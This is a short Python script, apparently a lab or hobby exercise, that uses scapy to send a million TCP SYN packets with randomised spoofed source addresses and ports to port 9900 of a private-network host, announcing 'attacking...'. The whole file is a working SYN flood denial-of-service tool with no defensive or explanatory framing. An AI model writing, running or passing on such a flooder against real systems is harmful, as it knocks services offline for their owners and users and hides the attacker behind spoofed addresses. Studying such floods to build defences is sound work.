from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
from scapy.volatile import RandIP, RandShort


def main():
    # All constants
    DST_PORT = 9900
    DST_IP = "192.168.1.106"
    LOOP_SIZE = 1_000_000

    print("attacking...")

    for _ in range(LOOP_SIZE):
        spoofed_packet = IP(src=RandIP(), dst=DST_IP) / TCP(dport=DST_PORT, sport=RandShort(), flags="S")
        send(spoofed_packet, verbose=0)

    print("done.")


if __name__ == '__main__':
    main()
